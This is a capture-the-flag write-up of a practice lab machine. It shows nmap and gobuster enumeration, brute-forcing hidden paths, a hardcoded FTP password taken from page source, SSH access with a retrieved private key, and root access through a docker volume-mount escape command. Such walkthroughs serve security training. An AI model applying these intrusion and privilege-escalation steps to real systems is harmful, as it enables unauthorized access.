# Information Gathering 

## Nmap Scan

```
nmap -sVC -A -p- 192.168.59.95
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-27 03:09 EDT
Nmap scan report for 192.168.59.95
Host is up (0.0038s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fecd90197491aef564a8a5e86f6eef7e (RSA)
|   256 813293bded9be798af2506795fde915d (ECDSA)
|_  256 dd72745d4d2da3623e81af0951e0144a (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Pwned....!!
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.30 seconds

```
## Inspect Source code 

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/61f0e02f-2817-45dc-957f-023c085f6d92)

## Robots.txt

```
# Group 1

User-agent: *
Allow: /nothing
Allow: /hidden_text
```

- In the /hidden_text we got the list of dirs
  ![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/beb3d5d4-0ec5-4657-97ba-6dfe06abb351)

## Directory Enumeration
`gobuster dir -u http://192.168.57.95/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html`

```
/index.html           (Status: 200) [Size: 3065]
/.html                (Status: 403) [Size: 278]
/robots.txt           (Status: 200) [Size: 61]
/nothing              (Status: 301) [Size: 316] [--> http://192.168.57.95/nothing/]
/.html                (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
/hidden_text          (Status: 301) [Size: 320] [--> http://192.168.57.95/hidden_text/]

```


- Just bruteforeced all thhe endpoint in the list(/hidden_text) using the burp intruder
![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/34f20aae-a0ee-4d0d-8504-65aa64ecd051)


- In the source page we got the user and pass

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/5e0bed84-fee4-4d15-ba33-1217f50cf3f6)

`($un=='ftpuser' && $pw=='B0ss_Pr!ncesS')`

## FTP access
- using the given user pass we can able to get into ftp user and got the **id_rsa** and a **note.txt**

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/49f0d46f-e994-4449-8e2f-21a1d1997a25)

## SSH

- In the note we got the name as ariana

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/e3d7b5b3-39b2-4e43-8e8a-3c2ca656d874)

😃

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/e472be55-8934-48d3-a9b3-9e460aa16a2e)

## User Flag

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/cdfde5dd-7bc4-4753-9b58-e4db4e91aee2)

- We can see other two person names are mentioned
![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/ea244d9e-eb99-4646-aaa7-4321961ae454)

- Checking the users 

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/2b10bd13-79c6-49f2-be84-24a51ed30be6)

Ultimate 😁

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/845cfc96-0464-4ad5-a1fd-ba77dcaf544a)

- For entering the messager.sh through selena , switch user as selena `sudo -u selena ./messenger.sh`

- This user has no flag :)

## Root Flag

-  The system is running on the docker container.

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/be9e863c-1879-47a4-b0e1-88fb8264971f)

- In the list of docker images there is a privesc image

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/af6a8836-b2ec-4e5e-81bd-0d9401c21e55)

finding a docker priv escal command in gtfobins

`docker run -v /:/mnt --rm -it alpine chroot /mnt sh`

![image](https://github.com/shyamprasath18/offsec-labs/assets/66670617/1a93d572-4c84-4d5e-8cc8-faeae31dd793)

<img src="https://github.com/shyamprasath18/offsec-labs/assets/66670617/adbbbc8d-6558-4b92-ad62-c1e1cceda037" width="200" />

